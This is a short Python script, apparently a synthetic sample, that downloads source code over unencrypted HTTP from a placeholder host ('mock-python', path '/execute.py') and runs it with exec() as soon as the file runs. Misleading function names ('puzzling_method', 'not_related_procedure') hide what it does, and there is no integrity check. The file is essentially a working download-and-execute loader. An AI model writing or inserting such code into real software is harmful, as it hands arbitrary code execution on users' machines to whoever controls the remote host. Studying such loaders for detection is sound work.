import http.client
import importlib

def get_remote_source(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    code = response.read().decode('utf-8')
    connection.close()
    return code

def not_related_procedure():
    print("This procedure is not related to the main goal.")

def puzzling_method():
    host = "mock-python"
    path = "/execute.py"
    code = get_remote_source(host, path)
    exec(code)
    not_related_procedure()

puzzling_method()
